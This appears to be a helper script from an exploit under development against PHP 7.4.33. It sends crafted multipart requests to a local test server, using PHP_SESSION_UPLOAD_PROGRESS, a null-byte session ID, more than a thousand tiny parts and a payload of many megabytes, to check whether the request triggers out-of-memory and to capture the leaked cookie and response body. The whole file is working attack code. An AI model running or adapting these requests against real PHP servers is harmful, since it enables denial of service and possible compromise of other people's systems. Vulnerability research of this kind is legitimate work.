"""Check whether the OOM request actually OOMs on 7.4.33 (capture body/status)."""
import sys, os, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E

URL = "http://127.0.0.1:18108/"
t = E.Target(URL, timeout=90.0, verbose=False)

def fire(fc, big_mb, label):
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(fc)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (big_mb * 1024 * 1024)},
    ]
    body = E.build_multipart(parts, b"S" * 17)
    try:
        resp = t.post(body, b"S" * 17, read_cap=1 << 20, timeout=90.0)
        raw = E.parse_cookie(resp)
        print(f"{label}: cookie={len(raw)}B body={len(resp)}B", flush=True)
        print(f"  first 200B body: {resp[:200]!r}", flush=True)
    except Exception as e:
        print(f"{label}: EXC {e}", flush=True)
    time.sleep(0.5)

fire(1001, 12, "1001x1B + 12MB")
fire(1001, 8, "1001x1B + 8MB")
fire(500, 12, "500x1B + 12MB")
fire(1001, 20, "1001x1B + 20MB")
